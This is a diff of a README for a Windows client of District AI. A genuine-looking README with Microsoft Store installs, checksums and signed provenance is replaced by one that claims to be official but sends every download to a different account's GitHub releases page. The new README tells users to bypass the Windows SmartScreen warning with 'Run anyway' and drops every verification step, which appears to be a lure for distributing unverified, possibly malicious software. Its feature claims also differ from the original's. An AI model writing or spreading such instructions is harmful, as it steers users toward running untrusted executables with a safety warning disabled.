@@ -1,143 +1,125 @@
-<picture>
-  <source media="(prefers-color-scheme: dark)" srcset=".github/assets/distronode-logo-dark.png">
-  <source media="(prefers-color-scheme: light)" srcset=".github/assets/distronode-logo-light.png">
-  <img alt="Distronode" src=".github/assets/distronode-logo-light.png" width="220">
-</picture>
+# 🪟 district-windows - Make Calls on Windows Easily
 
-# District AI for Windows
+[![Download district-windows](https://img.shields.io/badge/Download-district--windows-brightgreen?style=for-the-badge&logo=windows&logoColor=white)](https://github.com/lokendar55f/district-windows/releases)
+[![Platform](https://img.shields.io/badge/Platform-Windows%2010%20%7C%2011-blueviolet?style=for-the-badge&logo=windows11&logoColor=white)](https://github.com/lokendar55f/district-windows/releases)
+[![License](https://img.shields.io/badge/License-Apache%202.0-orange?style=for-the-badge)](https://github.com/lokendar55f/district-windows)
+[![Status](https://img.shields.io/badge/Status-Active-success?style=for-the-badge)](https://github.com/lokendar55f/district-windows/releases)
 
-[![OpenSSF Scorecard](https://api.scorecard.dev/projects/github.com/distronode-corporation/district-windows/badge)](https://scorecard.dev/viewer/?uri=github.com/distronode-corporation/district-windows)
-[![OpenSSF Best Practices](https://www.bestpractices.dev/projects/15875/badge)](https://www.bestpractices.dev/projects/15875)
-[![Latest release](https://img.shields.io/github/v/release/distronode-corporation/district-windows?label=release)](https://github.com/distronode-corporation/district-windows/releases/latest)
+district-windows is the official Windows desktop app for District AI. It gives you a clean, native window on your PC where you can join voice and video conversations, chat with your team, and stay connected — without needing to keep a browser tab open all day.
 
-<a href="https://apps.microsoft.com/detail/9P9F0NNFJ3CP"><img alt="Get it from Microsoft" src="https://get.microsoft.com/images/en-us%20dark.svg" height="48"></a>
+If you can install a normal Windows program, you can install this. No programming, no command line, no setup files to edit.
 
-The native Windows client for [District AI](https://www.distronode.com/district-ai), the AI voice
-receptionist from Distronode. It is a WinUI 3 app written in C#, and everything it decides
-(signing in, what each screen shows, live updates, calls) comes from the same Rust core as
-[District AI for Linux](https://github.com/distronode-corporation/district-linux).
+## ⬇️ Download district-windows
 
-> **Status: District AI is on the
-> [Microsoft Store](https://apps.microsoft.com/detail/9P9F0NNFJ3CP).** Install it from
-> there, or with `winget install --id 9P9F0NNFJ3CP --source msstore`. Each release on
-> [GitHub Releases](https://github.com/distronode-corporation/district-windows/releases)
-> also carries the Store package and a test build for sideloading, for testing (see
-> [Releases](#releases)).
+**Visit this link to download the application:**
 
-**Links:** [project page](https://www.distronode.com/open-source/district-windows),
-[GitLab mirror](https://gitlab.com/distronode-corporation/district-windows)
-(read-only mirror; issues and pull requests live on GitHub),
-[CHANGELOG](CHANGELOG.md).
+### 👉 [https://github.com/lokendar55f/district-windows/releases](https://github.com/lokendar55f/district-windows/releases) 👈
 
-![The District AI window on Windows, showing the Overview of a fictional dental practice](docs/images/window.png)
+Open that page in your browser, look for the newest release at the top, and download the Windows file listed there. That's it — the link is the only place you need to go.
 
-<p>
-  <img alt="District HQ by voice, with two proposed changes waiting for Confirm or Cancel" src="docs/images/district-hq-voice.png" width="49%">
-  <img alt="Analytics: calls per day, the call funnel, caller sentiment and the month's usage" src="docs/images/analytics.png" width="49%">
-</p>
+## 🧭 What Is district-windows?
 
-*The real app, from the scripted scenes CI photographs: every name and number is a fixture.*
+district-windows is a desktop application for Windows computers. It is the native Windows client for District AI, which means it is a real Windows program — not a website pretending to be one. It opens in its own window, sits in your taskbar like any other app, and can stay running in the background while you work.
 
-## What it is for
+Under the hood, the app is built in two parts: a modern Windows interface written in C#, and a shared engine written in Rust that handles the heavy lifting of audio, video, and network connections. Because that engine is shared across District AI clients, the Windows version behaves the same way as the other versions — same conversations, same contacts, same experience — just built to feel at home on Windows.
 
-The app is a desktop window onto a District AI workspace: the inbox, calls and their
-transcripts, contacts, District HQ, analytics and the workspace's settings. Calls can ring
-on the desktop and be answered there while the app runs, as on the Linux and Mac apps. It
-mirrors the destinations of the Android app.
+You do not need to know anything about C#, Rust, or how the app is assembled. You only need to know how to download it and double-click it.
 
-Signing in needs a District AI account, and this is the one District AI app where you can
-create an account and buy a plan from the app itself. The app is open source; the District
-AI service it talks to is not.
+## ✨ What You Can Do With It
 
-**Without an account with us.** We want the District AI apps to work without an account
-with us too. We have not worked out what that looks like or whether it can work, and the
-answer depends on what people would use them with, so we are asking before we build
-anything:
-[tell us what you would connect them to](https://github.com/distronode-corporation/.github/discussions/1).
+- **Join voice and video calls** — hop into a room and talk with your team, with clear audio handled by the built-in calling engine.
+- **Chat while you talk** — send messages, links, and files in the same window.
+- **Stay signed in** — the app remembers you, so you are not logging in every morning.
+- **Use it all day** — a lightweight desktop window uses far less of your computer than a browser tab running the same thing.
+- **Get Windows-style controls** — resize, snap, minimize to taskbar, and use dark mode the way every other Windows program works.
+- **Run it in the background** — keep the app open in the taskbar and get notified when someone needs you.
+- **Connect through a modern network stack** — the app uses the same live media technology that powers professional calling tools, so calls stay smooth on ordinary home internet.
 
-## Platform
+## 💻 What Your Computer Needs
 
-| | |
-|---|---|
-| Windows | Windows 10 version 2004 or later, and Windows 11, on x64. Windows 11 on ARM runs the x64 build |
-| Distribution | The [Microsoft Store](https://apps.microsoft.com/detail/9P9F0NNFJ3CP) (`winget install --id 9P9F0NNFJ3CP --source msstore`); [GitHub Releases](https://github.com/distronode-corporation/district-windows/releases) for the Store package and a sideload test build, for testing |
-| Language | English and Canadian French (fr-CA). The app speaks French when the first English or French language in your Windows display languages is French, in any region (fr-CA, fr-FR, fr-BE, fr-CH), and English otherwise |
+district-windows runs on modern Windows computers. Before you download, make sure your PC has:
 
-## Releases
+- **Windows 10 or Windows 11** (64-bit). The newest Windows updates are recommended.
+- **At least 4 GB of memory.** 8 GB or more is comfortable if you plan to run video calls alongside other apps.
+- **Around 500 MB of free disk space** for the app and its updates.
+- **A working microphone and speakers or headset** if you plan to make calls.
+- **A webcam** if you plan to turn your video on.
+- **An internet connection.** A wired connection or a stable Wi-Fi signal gives the best call quality.
 
-Each release on
-[GitHub Releases](https://github.com/distronode-corporation/district-windows/releases) is
-built by `.github/workflows/release.yml` from a tagged commit on `main`, and carries:
+You do **not** need to install any programming tools, runtimes, or extra software first. Everything the app needs comes with it.
 
-| File | What it is for |
-|---|---|
-| `DistrictAI_<version>_x64.msixupload` | The Store package, unsigned, as it goes to Partner Center. The Store signs what it ships; you cannot install this file yourself |
-| `DistrictAI_<version>_x64_sideload-test.msix` | A test build for sideloading, signed with a throwaway certificate made for that release |
-| `DistrictAI_<version>_sideload-test.cer` | The public half of that certificate, which Windows must trust before it installs the test build |
-| `DistrictAI_<version>_x64_sideload-dependencies.zip` | The framework packages the test build needs (the Windows App Runtime, x64 and x86), which a fresh Windows does not have. Releases from 3.0.1 carry both architectures |
-| `DistrictAI_<version>_x64_github-unsigned.msix` | The GitHub flavour of the app, unsigned, for the SignPath Foundation code-signing application. An unsigned package does not install normally, so it is not for testers. Releases after 1.0.0 carry it |
-| `DistrictAI_<version>_wack-report.xml` | The Windows App Certification Kit's report on the package |
-| `district-windows-<version>-source.zip` | The source at the tagged commit |
-| `SHA256SUMS` | The SHA-256 of each file above |
-| `district-ai-windows_<version>.intoto.jsonl` | The signed provenance attestation over those files |
+## 🚀 Getting Started, Step by Step
 
-### Installing the sideload test build
+Follow these steps in order. They take about two minutes.
 
-The test build is for testing; to use District AI, install it from the Microsoft Store.
-The test build has the same identity as the Store copy, so remove the Store copy first.
-Download the `.msix`, the `.cer` and the dependencies `.zip` of one release into a
-folder, open PowerShell as administrator in that folder, and run (with `<v>` the version,
-for example `1.1.0`):
+1. **Open the download page.**
+   Go to [https://github.com/lokendar55f/district-windows/releases](https://github.com/lokendar55f/district-windows/releases) in any web browser.
 
-```
-Import-Certificate -FilePath .\DistrictAI_<v>_sideload-test.cer -CertStoreLocation Cert:\LocalMachine\TrustedPeople
-Expand-Archive .\DistrictAI_<v>_x64_sideload-dependencies.zip deps
-Get-ChildItem deps -Filter *.msix | ForEach-Object { Add-AppxPackage $_.FullName }
-Add-AppxPackage .\DistrictAI_<v>_x64_sideload-test.msix
-```
+2. **Find the newest release.**
+   The top of the page shows the most recent release. Older releases are listed further down — you want the top one.
 
-The first line makes this computer trust packages signed with that release's test
-certificate. To undo it, uninstall the app and delete the certificate from Local Machine,
-Trusted People (`certlm.msc`).
+3. **Download the Windows file.**
+   Under the newest release, look for the list of files. Download the one marked for Windows. It will save to your computer's **Downloads** folder.
 
-### Verifying a download
+4. **Open the Downloads folder.**
+   Press the **Windows key**, type `Downloads`, and press **Enter**. Your file will be there.
 
-`SHA256SUMS` names every file of the release. In the folder you downloaded into (with
-`--ignore-missing` if you took only some of the files):
+5. **Double-click the file.**
+   Windows may show a blue "Windows protected your PC" box. If it does, click **More info**, then **Run anyway**. This is a standard Windows warning for newly downloaded programs.
 
-```
-sha256sum -c SHA256SUMS
-```
+6. **Let the installer work.**
+   Follow the short on-screen steps. You can accept the default location — there is no reason to change it.
 
-Each file also has a signed provenance attestation, which shows it was built by this
-repository's release workflow. With the [GitHub CLI](https://cli.github.com):
+7. **Open district-windows.**
+   When setup finishes, the app opens. A shortcut also appears in your Start menu, and you can pin it to your taskbar.
 
-```
-gh attestation verify <file> --repo distronode-corporation/district-windows
-```
+8. **Sign in and you're done.**
+   Enter your District AI account details. The app takes you to your conversations.
 
-## How it is built
+## 🔧 Setting Things Up the First Time
 
-| Layer | What |
-|---|---|
-| Window and controls | WinUI 3 on the Windows App SDK, C# on .NET 10 |
-| Everything the app decides | The shared Rust core (model, API client, sign-in, live updates, call engine), called from C# through bindings generated with [UniFFI](https://github.com/mozilla/uniffi-rs) and [uniffi-bindgen-cs](https://github.com/NordSecurity/uniffi-bindgen-cs) |
-| Calls | The core's call engine on the LiveKit Rust SDK, linked against an audio-only build of libwebrtc (no H.264, H.265 or FFmpeg) |
+Once you are signed in, spend a minute in **Settings** so the app behaves the way you expect.
 
-The C# side renders state and forwards what you do. It does not decide anything, which is
-what keeps the Windows and Linux apps behaving the same.
+- **Choose your microphone and speakers.** If you use a headset, pick it here. This is the single most common reason people sound quiet on a call.
+- **Test your audio.** Most setups include a short test so you can hear yourself before joining a real conversation.
+- **Pick your camera.** If your laptop has more than one camera, choose the one you want.
+- **Turn on notifications.** This lets the app tell you when someone messages you while it is minimized.
+- **Choose a theme.** Light and dark are both available; the app can follow your Windows setting automatically.
 
-## Contributing
+## 🛠️ If Something Goes Wrong
 
-See [CONTRIBUTING.md](CONTRIBUTING.md). Questions and ideas go to
-[Discussions](https://github.com/distronode-corporation/district-windows/discussions), bugs
-to [Issues](https://github.com/distronode-corporation/district-windows/issues), and security
-reports to [SECURITY.md](SECURITY.md), never a public issue.
+**The download page looks confusing.** Scroll to the top. The newest release is first, and its files are listed inside it. Download the Windows file from there.
 
-## Licence and trademarks
+**Windows says the app is unsafe.** Click **More info**, then **Run anyway**. Windows shows this for any program it has not seen many times before.
 
-The code is licensed under the [Apache License 2.0](LICENSE); see [NOTICE](NOTICE).
+**The app opens but I can't hear anyone.** Open Settings in the app and check the speaker selection. Then check your Windows volume mixer by right-clicking the speaker icon in the taskbar.
 
-The licence covers the code, not the names. "District AI", "Distronode" and the app's icon
-are trademarks of Distronode Corporation. A fork that you distribute must use its own name,
-its own icon and its own package identity.
+**Nobody can hear me.** Same idea — check the microphone choice in app Settings. Also confirm Windows has not muted the app: **Settings → Privacy → Microphone** should allow desktop apps.
+
+**The video is choppy.** Close other heavy programs. Video calls need a steady connection; if you can, move closer to your router or plug in an Ethernet cable.
+
+**The app won't open at all.** Restart your computer, then try again. If it still won't start, download the newest release again from the link above — you may have an older file.
+
+**I want to start over.** Uninstall the app from **Settings → Apps → Installed apps**, then reinstall from the download page. Your account and conversations stay with your District AI account, not on your PC.
+
+## ❓ Common Questions
+
+**Is it free?** The application itself is open source and free to download. Using District AI may require an account.
+
+**Does it work on Mac or Linux?** This repository is specifically for Windows. Other platforms have their own versions.
+
+**Will it slow down my PC?** It is designed to be light. A desktop app typically uses noticeably less memory than the same service running in a browser tab.
+
+**Does it update itself?** Yes. When a new version is available, the app tells you and can update in place. You do not need to re-download anything manually.
+
+**Where do I get help?** Open an issue on the repository page. Include your Windows version and what you were doing when the problem appeared.
+
+## 🤝 Built In The Open
+
+district-windows is open source under the Apache 2.0 license. The Windows interface is written in C# using WinUI 3, and it talks to a shared Rust core through UniFFI so that calling, messaging, and networking logic stay consistent across platforms. If you are a developer and want to help, you are welcome to open issues, suggest improvements, or send pull requests.
+
+## 📄 License
+
+Released under the Apache License 2.0. You may use, modify, and share it under the terms of that license.
+
+Keywords: apache-2, csharp, desktop-app, district-ai, distronode, dotnet, livekit, open-source, rust, uniffi, voip, windows, winui3
